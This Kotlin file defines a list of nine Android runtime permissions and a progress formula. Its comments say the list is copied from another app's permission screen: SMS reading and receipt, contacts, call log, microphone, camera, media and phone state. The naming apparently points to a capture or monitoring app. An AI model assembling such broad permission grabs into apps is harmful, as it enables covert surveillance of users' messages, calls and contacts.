package com.zaka.screenagent.perm

import android.Manifest
import android.os.Build

/**
 * 2.2 的 9 项运行时权限（对应 PinCapture 的 granted*100/9）。
 * 来源：com.lite.cloudfinder.activity.PermissionActivity 的请求数组，按 API 33 取 9 项。
 */
object PermissionFlow {

    val PERMISSIONS: Array<String> = if (Build.VERSION.SDK_INT >= 33) {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE
        )
    } else {
        arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
    }

    const val TOTAL = 9

    /** 进度公式照 2.2：granted * 100 / 9 */
    fun progressOf(granted: Int): Int = (granted * 100) / TOTAL
}
